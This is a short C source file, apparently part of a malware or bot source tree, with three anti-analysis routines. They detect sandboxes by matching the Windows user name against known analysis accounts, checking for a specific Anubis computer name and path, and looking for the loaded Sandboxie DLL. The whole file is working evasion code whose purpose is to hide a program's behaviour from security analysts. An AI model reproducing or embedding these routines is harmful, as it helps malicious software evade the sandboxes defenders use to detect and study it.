#include "../h/includes.h"

BOOL AntiSandBox()
{
	char *users[] = {"sandbox", "honey", "vmware", "currentuser", "nepenthes", "andy"};
	DWORD size = 128;
	char szUser[128];
	int i;

	GetUserName(szUser, &size);
	CharLower(szUser);

	for (i = 0; i <	(sizeof(users) / sizeof(LPTSTR)); i++)
	{
		if (strstr(szUser, users[i]) != 0)
			 return TRUE;
	}

	return FALSE;
}

BOOL AntiAnubis()
{
	char buf[128];
	char *p;
    GetWindowsDirectory(buf, sizeof(buf)); 
	DWORD dwSize = 128; 
   /* Detect Computer Name */
   if(GetComputerName(buf, &dwSize) != 0) {
      if(!strcmp(buf, "TU-4NH09SMCG1HC")) return TRUE;
   }

   /* Detect Current Directory */
   char ModulePath[MAX_PATH];
   GetModuleFileName(NULL, ModulePath, MAX_PATH);
   
   p = strstr(ModulePath, "InsideTm");
   if(p != NULL) return TRUE; 

   return FALSE;
}

BOOL AntiSandboxie()
{
   HMODULE hMod;
   hMod = GetModuleHandleA("SbieDll.dll");
   if (hMod == 0)
      return FALSE;
   return TRUE;
}
 
